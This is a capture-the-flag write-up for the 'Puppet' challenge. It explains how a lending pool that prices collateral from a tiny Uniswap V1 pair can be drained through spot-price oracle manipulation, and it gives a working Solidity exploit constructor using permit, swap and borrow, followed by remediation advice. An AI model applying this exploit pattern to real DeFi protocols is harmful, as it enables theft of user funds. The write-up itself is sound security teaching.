# 07 — Puppet

**Class:** Spot-price oracle manipulation (thin-liquidity AMM as price feed)
**Goal:** Steal the lending pool's 100,000 DVT into the recovery account in a
**single player transaction**.

## The setup

`PuppetPool` lets you borrow DVT if you post **twice its value in ETH** as
collateral. "Value" comes from a Uniswap **V1** pair used directly as an oracle:

```solidity
function _computeOraclePrice() private view returns (uint256) {
    return uniswapPair.balance * 1e18 / token.balanceOf(uniswapPair); // ETH per token
}
```

The pair has only **10 ETH / 10 DVT** of liquidity. The player holds 1000 DVT and
25 ETH.

## Root cause

The oracle is the **instantaneous reserve ratio of a low-liquidity AMM pool**, with
no TWAP, no deviation bounds, and no sanity floor. Because the pool is tiny, a
single swap moves the reported price by orders of magnitude. Selling the player's
1000 DVT into a 10-DVT pool crashes `token.balanceOf(pair)` upward and drains its
ETH, so `_computeOraclePrice` collapses — and with it the required collateral for
borrowing the pool's entire 100k DVT.

Before: borrowing 100k DVT requires ~200k ETH. After the swap: it requires ~20 ETH.

## Exploit — one transaction via constructor + permit

Two obstacles: (a) the manipulation + borrow is several calls, and (b) the exploit
contract needs the player's DVT. Both are solved by doing everything in a
**contract constructor** (the single tx) and pulling the player's tokens with an
**EIP-2612 `permit`** signed off-chain (no extra tx):

```solidity
constructor(..., uint256 tokenAmount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) payable {
    address owner = msg.sender;                                   // the player
    token.permit(owner, address(this), tokenAmount, deadline, v, r, s);
    token.transferFrom(owner, address(this), tokenAmount);        // pull 1000 DVT

    token.approve(address(uniswap), tokenAmount);
    uniswap.tokenToEthSwapInput(tokenAmount, 1, deadline);        // crash the price

    uint256 poolBalance = token.balanceOf(address(pool));
    uint256 required = pool.calculateDepositRequired(poolBalance);
    pool.borrow{value: required}(poolBalance, recovery);          // borrow it all
}
```

The player signs the permit for the exploit's **predicted CREATE address**
(`vm.computeCreateAddress(player, nonce)`) so the signature is valid before the
contract exists, then deploys with `new PuppetExploit{value: player.balance}(...)`.
The ETH from the swap plus the player's 25 ETH comfortably covers the now-tiny
collateral.

## Remediation

- **Never price collateral off a spot AMM reserve ratio.** Use a manipulation-
  resistant oracle: Chainlink price feeds, or a Uniswap **TWAP** over a meaningful
  window, ideally with staleness and deviation checks.
- Add sanity bounds (min/max price, circuit breakers) and require deep,
  incentivized liquidity before trusting an on-chain pool as a reference.
- Cap per-block price movement the protocol will act on.

## Real-world parallel

Spot-price oracle manipulation via flash loans or thin liquidity is the single
most damaging DeFi bug class historically — Harvest Finance, Cheese Bank, Value
DeFi, bZx, and many others were drained exactly this way. Puppet is its minimal
reproduction.
